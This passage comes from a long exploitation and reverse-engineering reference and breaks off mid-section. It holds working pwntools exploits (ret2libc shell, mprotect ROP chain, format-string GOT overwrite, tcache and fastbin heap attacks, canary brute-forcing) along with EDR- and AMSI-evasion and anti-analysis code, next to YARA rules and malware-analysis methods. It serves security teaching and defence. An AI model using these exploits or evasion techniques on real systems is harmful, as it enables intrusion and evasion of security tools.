# Calculate libc base
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = leaked_puts - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Stage 2: system("/bin/sh")
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh')))

payload2 = b'A' * offset + rop2.chain()
p.sendline(payload2)
p.interactive()
```

### 4.2 Return-Oriented Programming (ROP)

ROP chains existing code snippets (gadgets) ending in `ret` to achieve arbitrary computation.

#### Gadget Finding

```bash
# ROPgadget
ROPgadget --binary ./target --ropchain
ROPgadget --binary ./target --only "pop|ret"
ROPgadget --binary ./target --grep "mov .*, rsp"

# ropper
ropper -f ./target --search "pop rdi; ret"
ropper -f ./target --chain execve
ropper -f ./target --type jop  # Jump-oriented gadgets

# pwntools automated
elf = ELF('./target')
rop = ROP(elf)
print(rop.find_gadget(['pop rdi', 'ret']))
print(rop.find_gadget(['pop rsi', 'pop r15', 'ret']))
```

#### Chain Construction

```python
# Manual ROP chain: mprotect() → shellcode execution
from pwn import *

elf = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# After leaking libc base...
libc.address = leaked_base

# Gadgets from libc
pop_rdi = libc.address + 0x23b6a   # pop rdi; ret
pop_rsi = libc.address + 0x2601f   # pop rsi; ret  
pop_rdx = libc.address + 0x142c92  # pop rdx; ret
pop_rax = libc.address + 0x36174   # pop rax; ret
syscall_ret = libc.address + 0x630a9  # syscall; ret

# mprotect(stack_page, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
stack_page = 0x7ffffffde000  # Aligned stack page
chain = flat(
    pop_rdi, stack_page,
    pop_rsi, 0x1000,
    pop_rdx, 7,              # PROT_READ|PROT_WRITE|PROT_EXEC
    pop_rax, 10,             # SYS_mprotect
    syscall_ret,
    stack_page + 0x100       # Jump to shellcode on stack
)
```

### 4.3 Format String Vulnerabilities

#### Reading Arbitrary Memory

```c
// Vulnerable code
printf(user_input);  // No format string → user controls format specifiers

// Reading stack values:
// Input: "%p.%p.%p.%p.%p.%p"
// Output: 0x7fffffffdea0.0x64.(nil).0x7ffff7f9a2a0.0x6.0x4141414141414141
//         ↑ stack values leaked                        ↑ our input at offset 6

// Direct parameter access (positional):
// Input: "%6$p"  → reads 6th argument position (our input)
// Input: "%7$s"  → reads string at address stored at position 7
```

#### Writing Arbitrary Memory

```python
# Format string write using %n (writes number of chars printed so far)
from pwn import *

# Target: overwrite GOT[exit] with address of win()
target_addr = 0x404028     # GOT entry for exit
win_addr = 0x401196        # Address of win()

# %n writes 4 bytes, %hn writes 2 bytes, %hhn writes 1 byte
# Write 0x401196 as two 2-byte writes:
# Low 2 bytes:  0x1196 = 4502
# High 2 bytes: 0x0040 = 64

# pwntools fmtstr helper
payload = fmtstr_payload(
    offset=6,              # Our input starts at printf arg position 6
    writes={target_addr: win_addr},
    numbwritten=0,
    write_size='short'     # Use %hn (2-byte writes)
)

p = process('./vuln')
p.sendline(payload)
p.interactive()
```

### 4.4 Heap Exploitation

#### Use-After-Free

```c
// Vulnerable pattern
struct obj {
    void (*handler)(struct obj *);
    char data[64];
};

struct obj *a = malloc(sizeof(struct obj));
a->handler = legitimate_handler;
free(a);                    // a is freed but pointer not nulled

// ... later, attacker allocates same-sized chunk
char *evil = malloc(sizeof(struct obj));
memcpy(evil, payload, sizeof(struct obj));  // Overwrites freed chunk

a->handler(a);  // UAF: calls attacker-controlled function pointer
```

#### Tcache Poisoning (glibc >= 2.26)

```python
# tcache poisoning: overwrite fd pointer in freed tcache chunk
from pwn import *

p = process('./heap_vuln')

# Allocate two chunks of same size
alloc(0, 0x20)  # chunk A
alloc(1, 0x20)  # chunk B

# Free both → tcache[0x30]: B → A
free(1)  # tcache: B
free(0)  # tcache: A → B

# Edit freed chunk A's fd pointer to target (e.g., __free_hook)
# In glibc >= 2.32, fd is XORed with heap base >> 12 (Safe Linking)
# For glibc < 2.32:
edit(0, p64(target_address))  # tcache: A → target

# Allocate twice: first gets A, second gets target
alloc(2, 0x20)  # Returns A
alloc(3, 0x20)  # Returns target_address — arbitrary write achieved

# Write system to __free_hook
edit(3, p64(libc.symbols['system']))
# Trigger: free a chunk containing "/bin/sh"
edit(0, b'/bin/sh\x00')
free(0)  # system("/bin/sh")
```

#### Fastbin Attack

```python
# Double-free in fastbin (glibc < 2.26 or with tcache exhausted)
# fastbin[0x30]: A → B → A (circular)

free(0)  # fastbin: A
free(1)  # fastbin: B → A
free(0)  # fastbin: A → B → A (double free)

# Now allocate and overwrite A's fd
alloc(2, 0x20)  # Returns A from fastbin
edit(2, p64(fake_chunk_addr))  # A's fd → fake_chunk

alloc(3, 0x20)  # Returns B
alloc(4, 0x20)  # Returns A (again)
alloc(5, 0x20)  # Returns fake_chunk — arbitrary allocation
```

#### House of Force

```python
# Prerequisite: ability to overwrite top chunk size with very large value
# Then: craft malloc request to wrap around and allocate at target

# Overwrite top chunk size
edit_top_chunk_size(0xffffffffffffffff)  # -1 in unsigned

# Calculate distance to target
top_chunk_addr = heap_base + current_top_offset
target = __malloc_hook_addr
distance = target - top_chunk_addr - 0x20  # Account for chunk headers

# Evil malloc: wraps arithmetic to place next allocation at target
alloc(distance)  # Advances top to just before target
alloc(0x20)      # Returns chunk at target — overwrite __malloc_hook
```

### 4.5 Integer Overflow Exploitation

```c
// Vulnerable code
void process_packet(int sock) {
    uint16_t len;
    read(sock, &len, 2);        // Attacker sends len = 0
    
    char *buf = malloc(len + 4); // malloc(4) — tiny allocation
    read(sock, buf, len);        // read(sock, buf, 0) — no overflow yet
    
    // OR: len = 65535, len + 4 = 3 (16-bit overflow)
    // malloc(3), read(sock, buf, 65535) → massive heap overflow
}

// Signed/unsigned mismatch
void copy_data(char *dst, char *src, int len) {
    if (len > MAX_BUF) return;     // Signed comparison — negative passes
    memcpy(dst, src, (size_t)len); // Cast to unsigned → huge positive value
}
```

---

## 5. Modern Mitigations and Bypasses

### 5.1 ASLR (Address Space Layout Randomization)

ASLR randomizes base addresses of stack, heap, shared libraries, and (with PIE) the main binary.

#### Information Leak Techniques

```python
# Method 1: Partial overwrite (1.5 bytes known in 64-bit)
# Low 12 bits (page offset) are always fixed
# Example: system@libc always ends in 0x???e50
# Overwrite only the lower bytes of a return address

# Method 2: Leaked pointer via format string / use-after-free
leaked_libc_ptr = u64(leak.ljust(8, b'\x00'))
libc_base = leaked_libc_ptr - known_offset
# All libc addresses now computable

# Method 3: /proc/self/maps read (if accessible)
# Reveals all mapped regions with addresses

# Method 4: Heap spray to probabilistic addresses
# Fill large regions → reduce entropy of successful hit

# Method 5: Brute force (32-bit only feasible)
# 32-bit Linux: ~8 bits entropy for stack, ~13 bits for libraries
# 64-bit: Impractical (28+ bits entropy)
```

#### Partial Overwrite

```python
# Only overwrite lowest 2 bytes of return address
# Preserves upper bytes (which are randomized)
# Success: 4-bit brute force (12 bits page offset known, 4 bits unknown)
offset = 120
target_offset_in_page = 0x1196  # Low 12 bits of target within page

# Overwrite return address's low 2 bytes
# Original: 0x7f????401050  →  0x7f????401196
payload = b'A' * offset + p16(target_offset_in_page)
# Requires: target is within same page (or adjacent) — ~1/16 success rate
```

### 5.2 Stack Canaries

A random value placed between local variables and the saved return address. Checked before function return.

```
Stack layout with canary:
┌───────────────────┐
│ Return address    │ ← Protected by canary
├───────────────────┤
│ Saved RBP         │
├───────────────────┤
│ Stack canary      │ ← Random value, checked before ret
├───────────────────┤
│ Local variables   │ ← Buffer overflow starts here
└───────────────────┘
```

#### Bypass Techniques

```python
# 1. Format string leak
# Canary is on the stack → leak it via %p format
payload = b'%17$p'  # Adjust offset to canary's position
p.sendline(payload)
canary = int(p.recv(), 16)

# 2. Byte-by-byte brute force (forking servers)
# Server forks per connection → child has same canary
# Overwrite one byte at a time, check if crash
# 256 * 7 = 1792 attempts max (skip null byte — canary starts with \x00)
def brute_canary(p_func, offset):
    canary = b'\x00'
    for i in range(7):
        for byte in range(256):
            p = p_func()
            attempt = b'A' * offset + canary + bytes([byte])
            p.send(attempt)
            response = p.recv(timeout=1)
            if b'normal_response' in response:
                canary += bytes([byte])
                break
            p.close()
    return canary

# 3. Overwrite canary with itself (leak + replay)
# If you can leak, just include correct canary in overflow payload:
payload = b'A' * offset_to_canary + p64(canary) + b'B' * 8 + p64(target_addr)

# 4. Thread-local storage overwrite
# Canary is stored in TLS (fs:[0x28] on x86-64)
# If you can write to TLS, overwrite the reference value
# Then any value in the stack canary slot will match
```

### 5.3 NX/DEP Bypass

Non-executable stack/heap prevents shellcode injection. Bypasses rely on code-reuse attacks:

```
ROP (Return-Oriented Programming):
  - Chain gadgets ending in 'ret'
  - Each gadget: 1-5 useful instructions + ret
  - Turing-complete computation possible

JOP (Jump-Oriented Programming):
  - Chain gadgets ending in indirect jumps (jmp [reg])
  - Dispatcher gadget: updates register, jumps to next gadget
  - Harder to detect (no 'ret' instructions)

COP (Call-Oriented Programming):
  - Chain gadgets ending in indirect calls (call [reg])
  - Uses call/ret semantics
  - Can interleave with normal function calls
```

### 5.4 RELRO

Relocations Read-Only hardens the GOT against overwrite attacks:

```
Partial RELRO (default with gcc):
  - .init_array, .fini_array, .dynamic → read-only after initialization
  - .got.plt → still writable (lazy binding)
  - Attack surface: overwrite GOT entries

Full RELRO (-Wl,-z,relro,-z,now):
  - All relocations resolved at load time (no lazy binding)
  - Entire GOT → mapped read-only
  - Attack surface: eliminated GOT overwrite
  - Downside: slower startup (all symbols resolved immediately)
  
Bypass Full RELRO:
  - Overwrite __free_hook, __malloc_hook (removed in glibc 2.34)
  - Overwrite function pointers in .data/.bss
  - Overwrite vtables (C++ objects)
  - Target other writable function pointer targets
```

### 5.5 PIE (Position-Independent Executable)

Combines with ASLR to randomize the main binary's base address:

```
Without PIE:
  Binary: 0x400000 (fixed) — gadgets at known addresses
  Libc:   0x7f???? (randomized)

With PIE:
  Binary: 0x55???? (randomized) — need leak for binary gadgets too
  Libc:   0x7f???? (randomized)

Bypass strategy:
1. Leak any binary pointer (return address on stack, GOT pointer)
2. Subtract known offset → binary base
3. All binary gadgets now computable
4. Chain to leak libc → compute libc gadgets
```

### 5.6 CFI (Control-Flow Integrity)

CFI restricts valid targets for indirect calls/jumps:

```
Forward-edge CFI (indirect calls):
  - LLVM CFI: type-based — indirect call target must match expected signature
  - Microsoft CFG (Control Flow Guard): bitmap of valid targets
  - Clang -fsanitize=cfi: compile-time type checking at indirect call sites

Backward-edge CFI (returns):
  - Shadow stack: separate stack stores only return addresses
  - Intel CET: hardware shadow stack (see below)

CFI Bypass Techniques:
  - Type confusion: find a function with matching signature but different behavior
  - COOP (Counterfeit Object-Oriented Programming): chain virtual method calls
  - Data-oriented programming: modify non-control data to change execution semantics
  - CFG bitmap manipulation (if writable)
  - Target functions within the valid set that enable further exploitation
    (e.g., valid target that calls system() with controllable argument)
```

### 5.7 Intel CET (Control-flow Enforcement Technology)

```
Shadow Stack:
  - Hardware-managed parallel stack storing return addresses only
  - CALL pushes to both regular stack AND shadow stack
  - RET compares: if mismatch → #CP exception (Control Protection)
  - Cannot be written by normal MOV/PUSH instructions
  - Shadow stack pages use special page table bit (dirty bit semantics)
  
  Bypass considerations:
  - Requires kernel support (Linux 6.6+, Windows 10 20H1+)
  - Attacker needs ability to manipulate shadow stack
  - WRSS instruction can write to shadow stack (if enabled) — requires CPL0 or
    specific XSAVE configuration
  - Signal handling: kernel must save/restore shadow stack on signal delivery

Indirect Branch Tracking (IBT):
  - ENDBR64/ENDBR32 must be first instruction at indirect branch targets
  - CPU tracks state: if indirect branch lands on non-ENDBR → #CP exception
  - Coarse-grained: any ENDBR64 is valid target (reduces gadget space but
    doesn't eliminate it)
  
  Bypass:
  - Target any function that starts with ENDBR64 (many in typical binary)
  - Use functions with ENDBR64 that perform useful operations
  - Combine with data-oriented programming
```

---

## 6. Malware Analysis

### 6.1 Static Indicators

#### Strings Analysis

```bash
# Basic strings extraction
strings -n 6 sample.exe | sort -u > strings_output.txt
strings -el sample.exe   # Little-endian 16-bit (Unicode)

# FLOSS: FLARE Obfuscated String Solver
floss sample.exe         # Extracts obfuscated/encrypted strings
floss -n 8 sample.exe    # Minimum length 8
```

#### Entropy Analysis

```python
# High entropy regions indicate encryption/compression/packing
import math
from collections import Counter

def calculate_entropy(data):
    if not data:
        return 0
    counter = Counter(data)
    length = len(data)
    entropy = -sum(
        (count / length) * math.log2(count / length)
        for count in counter.values()
    )
    return entropy

# Section-by-section entropy
# .text: typically 5.5-6.5 (compiled code)
# .data: varies (0-8 depending on content)
# Packed sections: > 7.0 (near-random data)
# Pure random: 8.0 (maximum for byte data)

# rabin2 entropy per section
# rabin2 -S sample.exe  → shows entropy column
```

#### Packing Detection

```bash
# Detect UPX
upx -t sample.exe        # Test if UPX packed
upx -d sample.exe -o unpacked.exe  # Decompress

# DIE (Detect It Easy)
diec sample.exe          # Identify packer/compiler/linker

# Indicators of packing:
# - Few imports (only LoadLibrary, GetProcAddress, VirtualAlloc)
# - High entropy in code section
# - Section names: UPX0, UPX1, .nsp, .aspack, .taz
# - Entry point not in first section
# - Large difference between SizeOfRawData and VirtualSize
# - Import table reconstructed at runtime
```

#### PE Anomalies

```
Suspicious indicators:
- Entry point outside .text section
- Writable + executable section flags (WX)
- Section names non-standard or empty
- Checksum mismatch (OptionalHeader.CheckSum)
- Resource section with high entropy (embedded payload)
- TimeDateStamp in the future or 0
- Debug directory pointing outside file
- TLS callbacks (code runs before entry point)
- Import of VirtualAlloc/VirtualProtect + WriteProcessMemory
- Small import table with GetProcAddress (runtime resolution)
```

### 6.2 Unpacking Techniques

#### Manual Unpacking Methodology

```
1. Identify packer (DIE, PEiD, visual inspection)
2. Set breakpoints at:
   - VirtualAlloc/VirtualProtect (memory allocation for unpacked code)
   - Tail jump (JMP to OEP — often a long relative jump after loops)
   - API resolution functions (GetProcAddress loops)
3. Run until Original Entry Point (OEP) reached
4. Dump process memory at OEP
5. Reconstruct Import Table (Scylla, ImpRec)
6. Fix PE headers (section alignments, entry point)
```

#### Dumping with Scylla

```
1. Load packed sample in x64dbg
2. Run until OEP (use hardware breakpoint on ESP trick or identify OEP pattern)
3. Scylla plugin → set OEP field
4. IAT Autosearch → Get Imports
5. Fix any invalid/unresolved imports manually
6. Dump → Fix Dump → produces working unpacked binary
```

#### ESP Trick (OEP Finding)

```
1. At entry point: PUSHAD saves all registers
   → Set hardware breakpoint on [ESP] (write)
2. Run → breaks when POPAD restores registers
3. Step forward → next JMP is tail jump to OEP
4. Single-step through JMP → you're at OEP
```

### 6.3 Anti-Analysis Techniques

```c
// VM Detection
void detect_vm() {
    // CPUID check for hypervisor brand
    int regs[4];
    __cpuid(regs, 0x40000000);
    char brand[13] = {0};
    memcpy(brand, &regs[1], 12);
    // "VMwareVMware", "Microsoft Hv", "KVMKVMKVM", "XenVMMXenVMM"
    
    // MAC address check (first 3 bytes = vendor OUI)
    // VMware: 00:0C:29, 00:50:56
    // VirtualBox: 08:00:27
    // Hyper-V: 00:15:5D
    
    // Registry/file artifacts
    // VMware: "C:\\Program Files\\VMware\\VMware Tools\\"
    // VBox: HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions
    
    // Timing: RDTSC difference between two consecutive calls
    uint64_t t1 = __rdtsc();
    uint64_t t2 = __rdtsc();
    if (t2 - t1 > 500) { /* VM/debugger detected */ }
    
    // SIDT/SGDT: In older VMs, IDT/GDT relocated to higher addresses
    // Less reliable on modern hardware-assisted virtualization
}

// API Hammering (exhaust analyst patience)
void waste_time() {
    for (int i = 0; i < 1000000; i++) {
        CreateMutex(NULL, FALSE, "random_name");
        CloseHandle(GetLastError() ? NULL : (HANDLE)1);
        Sleep(0);
    }
}

// String obfuscation: XOR encode all strings
char* decode_string(const unsigned char* encoded, int len, unsigned char key) {
    char* decoded = malloc(len + 1);
    for (int i = 0; i < len; i++)
        decoded[i] = encoded[i] ^ key;
    decoded[len] = 0;
    return decoded;
}
```

### 6.4 YARA Rule Creation

```yara
rule APT_Backdoor_CustomRAT {
    meta:
        author = "Threat Intel Team"
        description = "Detects custom RAT used by APT-XX"
        date = "2025-03-15"
        hash = "a1b2c3d4e5f6..."
        tlp = "white"
        
    strings:
        // XOR-encoded C2 domain (key=0x37)
        $encoded_c2 = { 58 54 54 47 48 1A 12 12 52 55 44 42 44 40 57 12 46 58 5A }
        
        // Mutex name pattern
        $mutex = "Global\\{" ascii wide
        
        // RC4 key schedule pattern
        $rc4_init = { 
            C7 45 ?? 00 01 00 00   // mov [ebp+var], 256
            33 C0                   // xor eax, eax  
            89 45 ??               // mov [ebp+var2], eax
            [0-4]
            3D 00 01 00 00         // cmp eax, 256
        }
        
        // Custom protocol magic bytes
        $magic = { CA FE BA BE DE AD }
        
        // API hashing (ROR13 pattern)
        $api_hash = {
            C1 C? 0D              // ror reg, 13
            0? ??                 // add reg, byte
            8? ??                 // cmp/test
            75 ??                 // jnz (loop)
        }
        
        // Suspicious imports combination
        $imp1 = "VirtualAllocEx" ascii
        $imp2 = "WriteProcessMemory" ascii
        $imp3 = "CreateRemoteThread" ascii
        $imp4 = "NtUnmapViewOfSection" ascii
        
    condition:
        uint16(0) == 0x5A4D and
        filesize < 500KB and
        (
            ($encoded_c2 and $mutex) or
            ($rc4_init and $magic) or
            (3 of ($imp*) and $api_hash)
        )
}

rule Suspicious_Packed_Binary {
    meta:
        description = "Detects suspiciously packed executables"
        
    strings:
        $mz = "MZ"
        
    condition:
        $mz at 0 and
        // High entropy in first section
        math.entropy(0, filesize) > 7.2 and
        // Few imports
        pe.number_of_imports < 5 and
        // Small import table with loader APIs
        pe.imports("kernel32.dll", "LoadLibraryA") and
        pe.imports("kernel32.dll", "GetProcAddress") and
        pe.imports("kernel32.dll", "VirtualAlloc")
}
```

### 6.5 C2 Protocol Identification

```python
# Network traffic analysis for C2 identification
# Common patterns:

# 1. DNS tunneling: unusual TXT/NULL queries, high entropy subdomains
#    Pattern: <base64_data>.subdomain.c2domain.com
#    Detection: entropy of subdomain > 3.5 bits/char, unusual query frequency

# 2. HTTP beaconing: periodic GET/POST with encoded data
#    Pattern: Regular interval ± jitter, custom User-Agent, 
#             base64/hex in URL parameters or POST body
#    Detection: Statistical analysis of connection timing

# 3. HTTPS with domain fronting:
#    TLS SNI = legitimate.cdn.com
#    HTTP Host header = actual-c2.cdn.com (after TLS termination)
#    Detection: SNI/Host mismatch in decrypted traffic

# 4. Custom TCP protocol:
#    Fixed magic bytes + length + encrypted payload
#    Example structure:
#    [MAGIC:4][LENGTH:4][COMMAND:1][SEQUENCE:4][PAYLOAD:variable][CRC:4]

# Decoding C2 traffic with Python
import struct

def parse_c2_packet(data):
    if len(data) < 17:
        return None
    magic, length, cmd, seq = struct.unpack('<IIBI', data[:13])
    if magic != 0xDEADBEEF:
        return None
    payload = data[13:13 + length]
    crc = struct.unpack('<I', data[13 + length:17 + length])[0]
    return {'cmd': cmd, 'seq': seq, 'payload': rc4_decrypt(payload, key)}
```

---

## 7. Windows Internals for RE

### 7.1 PE Loader Internals

The Windows loader (ntdll!LdrpInitializeProcess) performs:

```
1. Map PE into memory (NtCreateSection + NtMapViewOfSection)
2. Process relocations (if ImageBase != preferred base)
3. Parse import directory → load dependent DLLs recursively
4. Resolve imports → populate IAT entries
5. Execute TLS callbacks (if present) — BEFORE entry point
6. Set up structured exception handling (SEH chain)
7. Call DllMain(DLL_PROCESS_ATTACH) for each loaded DLL
8. Call CRT initialization (__scrt_common_main_seh)
9. Jump to entry point (AddressOfEntryPoint)
```

### 7.2 TEB and PEB Structures

```c
// Thread Environment Block (FS:[0x00] on x86, GS:[0x00] on x64)
typedef struct _TEB {
    NT_TIB NtTib;                    // 0x00 - Exception chain, stack limits
    PVOID EnvironmentPointer;         // 0x38
    CLIENT_ID ClientId;               // 0x40 - PID and TID
    PVOID ActiveRpcHandle;            // 0x50
    PVOID ThreadLocalStoragePointer;  // 0x58
    PPEB ProcessEnvironmentBlock;     // 0x60 - Pointer to PEB ← important
    // ...
} TEB;

// Process Environment Block
typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;    // 0x00
    BOOLEAN ReadImageFileExecOptions; // 0x01
    BOOLEAN BeingDebugged;            // 0x02 ← anti-debug target
    BYTE BitField;                    // 0x03
    PVOID Mutant;                     // 0x08
    PVOID ImageBaseAddress;           // 0x10
    PPEB_LDR_DATA Ldr;               // 0x18 ← loaded module list
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;  // 0x20
    // 0x68: ApiSetMap
    // 0xBC: NumberOfProcessors
    // 0xE8: OSMajorVersion
    // 0x118: ProcessHeap
} PEB;

// PEB_LDR_DATA → InMemoryOrderModuleList → LDR_DATA_TABLE_ENTRY
// Walk this list to find loaded DLLs (malware uses this to find kernel32 base)
```

### 7.3 Direct Syscall Technique

```asm
; Direct syscall bypasses API hooks (EDR/AV hook ntdll.dll functions)
; Concept: call the syscall instruction directly without going through ntdll

; NtAllocateVirtualMemory syscall stub (Windows 10 21H2):
; Normal ntdll path:
;   mov r10, rcx
;   mov eax, 0x18        ; syscall number (varies by Windows version!)
;   syscall
;   ret

; Direct syscall technique:
section .text
global NtAllocateVirtualMemory

NtAllocateVirtualMemory:
    mov r10, rcx          ; Windows syscall convention
    mov eax, 0x18         ; SSN for NtAllocateVirtualMemory
    syscall
    ret

; SSN (System Service Number) resolution at runtime:
; 1. Read ntdll.dll from disk (unhook bypass)
; 2. Parse Zw* export stubs to extract syscall numbers
; 3. Sort by address — ordinal position = SSN
; 4. Or: use Hell's Gate / Halo's Gate technique to read from memory
```

```c
// Hell's Gate: resolve SSN from potentially hooked ntdll
// Walk ntdll exports, find Zw* functions, extract syscall numbers
// from the MOV EAX, <SSN> pattern even if first bytes are JMP (hook)

// Halo's Gate: if the function is hooked (first bytes != 4C 8B D1 B8)
// look at neighboring syscall stubs (±1, ±2...) which are unhooked
// SSN = neighbor_SSN ± distance
```

### 7.4 COM Object Reverse Engineering

```
COM objects expose interfaces through vtable pointers:

IUnknown (base of all COM):
  vtable[0] = QueryInterface
  vtable[1] = AddRef
  vtable[2] = Release

Finding COM implementations:
1. Registry: HKCR\CLSID\{GUID}\InprocServer32 → DLL path
2. TypeLib: HKCR\TypeLib\{GUID} → .tlb file (use oleview.exe)
3. In binary: DllGetClassObject export → IClassFactory → CreateInstance
4. Trace CoCreateInstance calls to identify CLSID/IID pairs

Reversing COM vtables in IDA:
- Find vftable (array of function pointers in .rdata)
- Create struct matching IUnknown + derived interface methods
- Apply struct type to vftable reference
- Methods become named in decompiler output
```

### 7.5 .NET Reversing

```bash
# dnSpy: .NET assembly browser + decompiler + debugger
# De-compile any .NET assembly to C# or VB.NET with full accuracy

# de4dot: .NET deobfuscator
de4dot obfuscated.exe -o deobfuscated.exe
# Supports: ConfuserEx, Dotfuscator, Eazfuscator.NET, SmartAssembly, etc.

# Key .NET internals for RE:
# - Metadata tables in #~ stream (TypeDef, MethodDef, MemberRef)
# - IL (Intermediate Language) bytecode → JIT compiled at runtime
# - R2R (Ready To Run) format: pre-JIT'd native code alongside IL
# - Single-file deployment: embedded assemblies in BUNDLE header
# - Protections: anti-tamper (hash verification), anti-debug (Debugger.IsAttached)
```

### 7.6 Windows Defender Internals

```
mpengine.dll — core scanning engine:
- Located in %ProgramFiles%\Windows Defender\
- Emulates x86/x64/JS/VBS/PowerShell/Flash/PDF
- mpscript.dll — scripting language for signature matching
- MpSigStub.exe — signature database updater

Analysis approach:
1. Enable defender debug logging: MpCmdRun.exe -Trace -Level 0xFF
2. Static RE of mpengine.dll (huge binary, 15-20MB)
3. Focus on: Lua-based signature engine, emulator escape detection,
   AMSI (Anti-Malware Scan Interface) integration
4. AMSI bypass: patching AmsiScanBuffer in amsi.dll (detected now)
   Current research: ETW-based detection, direct syscalls for evasion

Emulation detection from inside the emulator:
- Limited API surface available
- Specific return values for certain API calls
- Memory layout differences
- Time acceleration (Sleep reduced)
```

---

## 8. Linux Internals for RE

### 8.1 ELF Dynamic Linking — PLT/GOT

```
Lazy binding sequence (first call to printf):

1. call printf@plt              ; Jumps to PLT stub
2. PLT stub:
     jmp [GOT[printf]]         ; First time: points to PLT+6 (next instr)
     push reloc_index           ; Push relocation index onto stack
     jmp PLT[0]                 ; Jump to dynamic linker resolver

3. PLT[0] (resolver trampoline):
     push [GOT[1]]             ; Push link_map pointer
     jmp [GOT[2]]              ; Jump to _dl_runtime_resolve

4. _dl_runtime_resolve:
     - Finds symbol "printf" in loaded libraries
     - Writes resolved address into GOT[printf]
     - Jumps to printf (this time, not next time)

5. Subsequent calls:
     call printf@plt
     jmp [GOT[printf]]         ; Now contains actual printf address
     → direct jump to printf
```

```
GOT layout:
GOT[0] = address of .dynamic section
GOT[1] = link_map pointer (internal to ld.so)
GOT[2] = _dl_runtime_resolve address
GOT[3] = first resolved function address
GOT[4] = second resolved function address
...
```

### 8.2 LD_PRELOAD Hooking

```c
// hook_malloc.c — intercept malloc calls
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>

typedef void* (*orig_malloc_t)(size_t);

void* malloc(size_t size) {
    orig_malloc_t orig_malloc = (orig_malloc_t)dlsym(RTLD_NEXT, "malloc");
    void* ptr = orig_malloc(size);
    fprintf(stderr, "[HOOK] malloc(%zu) = %p\n", size, ptr);
    return ptr;
}

// Compile: gcc -shared -fPIC -o hook_malloc.so hook_malloc.c -ldl
// Usage:   LD_PRELOAD=./hook_malloc.so ./target_binary

// Anti-LD_PRELOAD:
// 1. setuid binaries ignore LD_PRELOAD
// 2. Binary can check /proc/self/maps for unexpected libraries
// 3. Direct syscall avoids libc (and thus hooks)
// 4. Static linking eliminates dynamic linker entirely
```

### 8.3 System Call Interface

```
x86-64 Linux syscall convention:
  Instruction: syscall
  Number:      RAX
  Arguments:   RDI, RSI, RDX, R10, R8, R9
  Return:      RAX (negative = -errno)
  Clobbered:   RCX (saved RIP), R11 (saved RFLAGS)

vDSO (virtual Dynamic Shared Object):
  Kernel maps a small shared library into every process
  Provides fast userspace implementations of:
  - clock_gettime, gettimeofday, time
  - getcpu
  Avoids actual syscall overhead for timing operations
  Location: visible in /proc/self/maps as [vdso]
```

### 8.4 Glibc Malloc Internals

```
ptmalloc2 chunk structure:
┌────────────────────────────┐
│  prev_size (if prev free)  │  8 bytes (only when previous chunk is free)
├────────────────────────────┤
│  size | flags              │  8 bytes (includes A|M|P bits in low 3 bits)
├────────────────────────────┤  ← Returned pointer (user data starts here)
│  User data                 │
│  ...                       │
│  (minimum 0x20 bytes total)│
└────────────────────────────┘

Flags in size field:
  P (PREV_INUSE) = bit 0 → previous chunk is allocated
  M (IS_MMAPPED) = bit 1 → chunk obtained via mmap
  A (NON_MAIN_ARENA) = bit 2 → chunk belongs to non-main arena

Bins:
  Fastbins:      single-linked LIFO, sizes 0x20–0x80 (8 bins)
  Tcache:        per-thread single-linked LIFO, 7 entries per size (0x20–0x410)
  Unsorted bin:  double-linked, recent frees land here first
  Small bins:    double-linked FIFO, sizes 0x20–0x3F0 (62 bins)
  Large bins:    double-linked sorted, sizes > 0x400

Exploitation-relevant behaviors:
  - free() inserts into tcache first (if not full, glibc >= 2.26)
  - tcache has no double-free checks (glibc < 2.29)
  - Safe-linking XORs fd with (chunk_addr >> 12) (glibc >= 2.32)
  - Consolidation: adjacent free chunks merge → unlink macro
  - Top chunk: wilderness at end of heap, extends via sbrk
```

### 8.5 Seccomp Analysis

```bash
# Dump seccomp filter from binary
seccomp-tools dump ./sandboxed_binary
# Output example:
#  line  CODE  JT   JF      K
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
#  0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
#  0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
#  0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
#  0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
#  0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
#  0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0011: 0x06 0x00 0x00 0x00000000  return KILL

# Bypass strategies:
# 1. Allowed syscalls only → constrain exploitation to permitted calls
# 2. Architecture confusion (if x86 compat not blocked, try int 0x80)
# 3. Return value mode (SECCOMP_RET_TRACE) allows ptrace modification
# 4. Kernel bugs in seccomp filter enforcement
```

### 8.6 eBPF Program Reversing

```bash
# Extract loaded eBPF programs
bpftool prog list
bpftool prog dump xlated id <ID>    # Translated BPF bytecode
bpftool prog dump jited id <ID>     # JIT'd native instructions

# eBPF instruction format (64-bit):
# [opcode:8][dst_reg:4][src_reg:4][offset:16][immediate:32]
# Classes: BPF_LD, BPF_LDX, BPF_ST, BPF_STX, BPF_ALU, BPF_JMP, BPF_ALU64

# Analyze eBPF programs attached to:
# - Network: XDP, TC, socket filters
# - Tracing: kprobes, uprobes, tracepoints
# - Security: LSM hooks (used by security tools)
# - cgroup: resource control, network filtering

# Tools:
# - bpftool: official kernel utility
# - bpf_dbg: BPF debugger
# - Ghidra eBPF processor module (community)
# - IDA eBPF loader (plugin)
```

---

## 9. Firmware and Embedded Reverse Engineering

### 9.1 Firmware Extraction

#### Hardware Interfaces

```
UART (Universal Asynchronous Receiver-Transmitter):
  - 3-4 pins: TX, RX, GND, (VCC)
  - Common baud rates: 9600, 38400, 57600, 115200
  - Often provides bootloader/root shell access
  - Finding UART: look for 4-pin headers, test with logic analyzer
